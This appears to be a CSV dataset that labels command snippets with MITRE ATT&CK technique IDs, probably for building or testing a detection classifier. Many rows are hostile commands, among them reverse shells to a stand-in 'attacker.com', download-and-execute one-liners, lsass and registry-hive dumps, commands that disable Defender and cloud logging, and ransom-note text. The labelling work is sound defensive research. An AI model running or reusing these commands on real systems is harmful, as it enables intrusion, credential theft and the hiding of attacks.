command,mitre_id
<PID>/mem,T1003
write-warning $cred.GetNetworkCredential().Password,T1056
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors,T1562
AuthorizationExecuteWithPrivileges,T1548
"sudo lsmod | grep -i ""xen-vbd\|xen-vnif""",T1082
InstallLanguage,T1614
SeShutdownPrivilege,T1529
spoolvulnscan -noninteractive -consoleoutput,T1046
/usr/lib/udev/rules.d/,T1546
"if ($ipAddr -like ""*,*"") {",T1046
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,T1060
"cmstp.exe /s ""$inf_file_uac"" /au",T1218
sc.exe start $service_name,T1543
Get-PassPol,T1201
"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> $output_file \;",T1217
sudo chmod +x /etc/rc.local,T1037
vim-cmd hostsvc/enable_ssh,T1021
else: import urllib as r,T1105
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,T1060
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa,T1059
<target>,T1222
shutdown /r /t 1,T1529
powershell.exe iwr -URI $remote_file -Outfile $local_path,T1105
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""0"" /f",T1562
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU,T1547
NSXPCConnection API,T1559
smbutil view -g //$computer_name,T1135
Start-Process -Wait $file1 /S;,T1219
"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",T1105
echo $sh_encoded | base64 -d | bash,T1140
echo $! > /tmp/evil_pid.txt,T1036
grc --pty /bin/sh,T1059
ApplicationImpersonation,T1548
New-Item $commandpath -Force | Out-Null,T1548
reg export HKLM\security %temp%\security,T1003
aws logs delete-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,T1562
GetRegValue,T1012
CreateToolhelp32Snapshot,T1057
FAX,T1007
"$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""",T1204
Start-Process -FilePath $env:windir\system32\sdclt.exe,T1548
Start-Sleep -s 30,T1098
g_CiOptions,T1553
", or",T1564
systemctl stop cbdaemon,T1562
"echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
sftp $username@$remote_host:$remote_file $local_path,T1105
"echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""",T1140
<mode>0600</mode>,T1222
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2",T1559
tp.Attributes = SE_PRIVILEGE_ENABLED;,T1562
iam.serviceAccountUser,T1548
"QueueName = """"",T1619
"$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002",T1566
pr_set_mm_exe_file,T1036
%temp%\SMB\,T1074
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon,T1027
procdump.exe -md {PATH:.dll} foobar,T1202
"Shell ""cmd.exe /c "" & schTasksCmd, vbNormalFocus",T1137
"su art -c ""whoami; exit""",T1078
"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",T1564
cloud.sh,T1546
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",T1564
wmic process call create $process_to_execute,T1047
ADORE.XSEC,T1037
New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,T1098
"[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""$computer_name"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")",T1021
</source>,T1222
mount -o bind /bin/sh /bin/mount,T1548
$STANDARD_INFORMATION,T1070
%SystemRoot%\System32\Config,T1027
Get-NetFirewallSetting,T1518
CheckRemoteDebuggerPresent,T1622
update-ca-trust,T1553
screencapture -x $output_file,T1113
"dd if=/proc/""${PID}""/mem of=""$output_file"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""",T1003
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},T1216
"$env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""",T1567
systemctl enable $systemd_service_file,T1543
HKCU\Environment\UserInitMprLogonScript,T1037
bc -s /path/to/input-file,T1005
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD,T1547
"netsh.exe add helper ""$helper_file""",T1546
"logger.exe ""{CMD}""",T1202
/systemd/system,T1543
"Get-ChildItem ""$file_path"" | % { $_.LastAccessTime = ""$target_date_time"" }",T1070
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",T1550
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,T1567
else,T1048
$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug,T1055
winword.exe,T1574
cat /path/to/input-file,T1005
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
"& ""PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html""",T1027
"echo """" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",T1547
secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt,T1201
sqldumper.exe 464 0 0x0110,T1003
"echo ""Type=simple""",T1543
echo 1> /proc/sys/kernel/sysrq,T1562
fail2ban-client add x,T1059
"Write-Host ""Failed to extract entry $($entry.FullName): $_"" -ForegroundColor Yellow",T1562
networksetup -setsecurewebproxy $interface $proxy_server $proxy_port,T1090
"Write-Output ""Enumeration complete. Results written to: $out""",T1083
"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",T1218
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f",T1112
stat $target_filename,T1070
"ls -la $HISTFILE # "" ls -la $HISTFILE""",T1562
task execute /bin/sh,T1059
"if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi",T1007
curl file:///path/to/temp-file -o /path/to/output-file,T1222
"write-output ""------------""| out-file $output_file -append",T1012
HH.exe {REMOTEURL:.chm},T1218
tasklist /v,T1057
WantedBy=multi-user.target' >/path/to/temp-file.service,T1059
"ssh $domain ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz",T1048
param (,T1005
IOCTL_DISK_GET_DRIVE_GEOMETRY,T1680
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",T1539
"Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",T1574
column /path/to/input-file,T1005
Get-ManagementRoleAssignment,T1069
"cscript ""$vbscript""",T1082
wmic process call create,T1047
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",T1216
squirrel.exe --update {REMOTEURL},T1218
/etc/profile,T1156
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,T1060
msiexec /q /i {REMOTEURL},T1218
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null,T1137
wmic process list > %TEMP%\T1119_3.txt,T1119
ispell /etc/hosts,T1059
net.exe users,T1087
net group /dom,T1087
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f",T1112
aws guardduty delete-detector --detector-id $detectorId,T1562
GetExtendedTcpTable,T1049
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,T1548
"require(""net"").connect(12345, ""attacker.com"", function () {",T1059
%SYSTEM32%,T1055
attrib.exe +h $file_or_folder\T1222.001_attrib2.txt,T1222
wsl.exe,T1218
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,T1112
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",T1204
"Write-Host ""Process Name: $processName)""",T1562
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0,T1112
"if [ -f ""/etc/$auditd_config_file_name"" ];",T1562
ScDeviceEnums,T1036
Evilginx2,T1539
New-Item -ItemType Key -Path $path,T1546
sed '' /path/to/input-file,T1005
show cdp neighbors,T1018
dir \\$computer_ip\admin$,T1135
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",T1218
uptime >> $output_file,T1082
var URL = Java.type('java.net.URL');,T1105
eb logs,T1548
"echo ""[Timer]"" >> $path_to_systemd_timer",T1053
InstallUtil.exe {REMOTEURL},T1105
"""$trufflesnout_path"" forest -n $domain",T1482
windows\system32\,T1053
if ($tcp.Connected) {,T1046
sudo dscl . -create /Users/$user_name UniqueID 333,T1564
"""$rar_exe"" a -r $output_file $input_path\*$file_extension",T1560
sysctl 'kernel.core_pattern=|/path/to/command',T1059
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic,T1547
cmd /c tasklist > %temp%\temp.ini,T1057
Get-MsolRole,T1069
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key,T1552
recentFiles.py,T1083
net use c: $share_name,T1070
"cmd.exe /c ""$local_folder\$local_executable"" golden /aes256:$krbtgt_aes256_key /ldap /user:$account /dc:$($domaincontroller) /printcmd /outfile:golden",T1558
"for /L %a in (1,1,$limit) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\$target_hive"" %temp%\$target_hivevss%a 2 >nul 2>&1) & dir /B %temp%\$target_hivevss*",T1003
ToolTech-RM,T1112
"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{""spec"":{""hostPID"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securityContext"":{""privileged"":true}}]}}'",T1611
env_auth = true,T1567
getUsername,T1033
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),T1548
HKCU\Software\ApplicationContainer\Appsw64,T1112
launchctl unload,T1569
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,T1555
/tmp/,T1564
systemsetup,T1082
openssl enc -in /path/to/input-file -out /path/to/output-file,T1222
lsof,T1049
"Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""",T1046
"New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter",T1098
Type=oneshot,T1059
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",T1546
) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (,T1027
OpenSSH,T1129
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\,T1547
ufw status numbered,T1562
"Invoke-Maldoc -macroFile ""$txt_path"" -officeProduct ""Word"" -sub ""Execute""",T1055
root,T1543
New-Item -Path $outDir -ItemType Directory -Force | Out-Null,T1083
GetWindowThreadProcessId,T1106
C:\ProgramData\,T1036
"sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV",T1564
ptrace,T1622
"Scriptrunner.exe -appvscript ""$payload_path""",T1202
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self],T1547
%SystemRoot%\System32\Wbem\Repository,T1027
chsh --shell /bin/bash nobody,T1078
httpsvc,T1543
"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;",T1497
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,T1202
$PS2,T1056
if ([string]::IsNullOrWhiteSpace($fileContent)) {,T1560
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\$app_name"" /t REG_SZ /d $new_path /f",T1112
"dir /s ""c:\Documents and Settings"" >> $output_file",T1083
"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",T1218
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate,T1048
jsc.exe /t:library {PATH:.js},T1127
"if (Test-Path ""C:\Users\Default\AppData\Local\Temp\hello.log"") { Remove-Item ""C:\Users\Default\AppData\Local\Temp\hello.log"" -Force; Write-Host ""[+] hello.log removed."" }",T1027
bridge -b /path/to/input-file,T1005
"echo ""[Service]"" >> $systemd_service_path/$systemd_service_file",T1543
diantz /f {PATH:.ddf},T1036
"echo ""[Install]"" >> $path_to_systemd_service",T1053
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",T1546
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID},T1553
"[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);",T1113
sts:GetFederationToken,T1098
net use,T1049
execvp,T1106
arj a x output-file,T1222
certutil -decode,T1140
~/Library/Keychains/,T1555
touch $file_to_setcap,T1548
wbemtool.exe,T1047
$HOME/.config/autostart/,T1547
/bin/launchctl load,T1569
"Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore",T1505
taskkill,T1489
"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",T1059
"echo ""1234567890"" > ""$file_to_manipulate""",T1070
"Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""",T1115
"foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}",T1018
$notificationPackagesValues += $passwordFilterName,T1556
RtlCreateUserThread,T1055
sc query windefend,T1518
OutputDebugString,T1106
file -m /path/to/input-file,T1005
net start,T1007
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",T1110
pcalua.exe -a {PATH:.exe},T1202
"Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};",T1546
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force",T1484
"Write-Host ""Download completed: $zipPath"" -ForegroundColor Green",T1562
cat $File_to_output,T1083
$result | Out-File -Encoding ASCII -append $file,T1016
touch -r <filename> <filename>,T1070
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $pfx_path -Password $mypwd,T1552
Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment,T1526
ln -fs /bin/sh /bin/ln,T1548
RECYCLE.BIN,T1564
icacls . /grant Everyone:F /T /C /Q,T1222
"stop-process -name ""calculator"" -Force -ErrorAction Ignore",T1218
Program Files(x86),T1485
c:close();,T1105
do_vslist,T1083
show clock detail,T1124
"{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",T1573
"""$procdump_exe"" -accepteula -ma lsass.exe $output_file",T1003
gcc -x c /dev/null -o /path/to/input-file,T1222
~/.bashrc,T1156
WriteFile,T1106
Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet,T1562
"reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg",T1546
wbadmin.exe delete catalog -quiet,T1490
sudo srm -r $system_log_folder #recursive deletion of log files,T1070
"%TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run",T1134
CreateMutexW(),T1480
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\ICM\Calibration,T1548
"rundll32.exe -sta ""AtomicTest""",T1546
netsh wlan show,T1016
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f",T1112
svchost.exe,T1036
"echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002",T1543
"Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
wificreds -consoleoutput -noninteractive,T1555
EnumFontsW(),T1106
execute-assembly,T1620
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f,T1562
echo 'import os' >> $python_script_name,T1059
kk_KZ,T1614
msbuild.exe @{PATH:.rsp},T1036
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid,T1012
clusters:,T1059
eth0,T1205
this.pipe(sh.stdin);,T1059
"Write-Host "" [-] Attempting ${password} on account $username.""",T1110
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",T1216
run-mailcap --action=edit text/plain:/path/to/output-file,T1548
dialog --textbox /path/to/input-file 0 0,T1005
Compress-Archive,T1560
pip config --editor '/bin/sh -s' edit,T1059
"Write-Host ""Registry value deleted: $registryValueName""",T1562
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force,T1546
"if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i $interface; fi;",T1040
.config,T1574
net time \\hostname,T1124
dd if=/dev/urandom bs=1 count=1 >> $file_to_pad #adds low-quality random data,T1027
/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.,T1554
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'",T1546
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',T1105
SeImpersonate,T1134
Dropbox Update Setup,T1547
cd .\tmp\victim-files,T1560
CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name,T1614
ZwUnmapViewOfSection,T1055
Invoke-Command,T1059
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",T1574
ln -s /bin/sh git-x,T1059
ldifde.exe -f $output_path\$output_file -p subtree,T1069
"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",T1105
